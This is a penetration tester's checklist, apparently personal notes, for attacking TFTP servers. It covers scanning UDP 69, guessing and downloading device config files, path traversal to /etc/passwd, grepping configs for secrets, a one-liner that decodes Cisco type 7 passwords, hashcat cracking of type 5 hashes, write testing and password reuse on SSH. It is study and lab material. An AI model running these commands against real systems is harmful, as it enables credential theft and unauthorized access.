# TFTP enumeration

## Is it there
TFTP is UDP 69 only, so it shows up in a UDP scan or not at all.
sudo nmap -Pn -sU -p 69 -sV --script tftp-enum <TargetIP>
- [ ] open|filtered alone proves nothing: a file that downloads does
- [ ] No login and no listing: I fetch a file by its exact name, or not at all
- [ ] Network devices and phone systems keep their configs here

## Fetch a file by name
With tftp-hpa, from the folder I want it in:
tftp -m binary <TargetIP> -c get running-config
Or inside the client:
tftp <TargetIP>
binary
get startup-config
quit
- [ ] A failed get can leave an empty file behind: ls -la before I believe it

## Names worth guessing
for f in running-config startup-config router-config switch-config config.txt backup.cfg; do tftp -m binary <TargetIP> -c get $f; done
find . -maxdepth 1 -type f -empty -delete
- [ ] Cisco phones: SEPTHE-MAC.cnf.xml, with the MAC from SNMP or a web page
- [ ] Paths too, in case the server is not locked to its folder: /etc/passwd, then ../../../../etc/passwd
- [ ] On Windows: C:\Windows\win.ini, then a web.config or unattend.xml
tftp -m binary <TargetIP> -c get /etc/passwd

## What a config gives
grep -iE 'password|secret|community|username' running-config
- [ ] Cisco type 7, password 7 followed by hex: reversible, with the line below
- [ ] Cisco type 5, secret 5 $1$...: hashcat -m 500, and more in :Pb hash-cracking
- [ ] SNMP community strings: :Pb snmp
Type 7, decoded on Kali:
python3 -c "import sys;x='dsfd;kfoA,.iyewrkldJKDHSUBsgvca69834ncxv9873254k;fg87';e=sys.argv[1];s=int(e[:2]);print(''.join(chr(int(e[i:i+2],16)^ord(x[(s+i//2-1)%len(x)])) for i in range(2,len(e),2)))" THE-TYPE7-HEX
hashcat -m 500 hashes.txt /usr/share/wordlists/rockyou.txt

## Can I write
echo proof > proof.txt
tftp -m binary <TargetIP> -c put proof.txt
tftp -m binary <TargetIP> -c get proof.txt proof-back.txt
- [ ] It comes back: the TFTP folder may be served on the web, or read by a service I can reach
- [ ] Every password found tried on SSH, the web logins and the rest: :Pb ssh
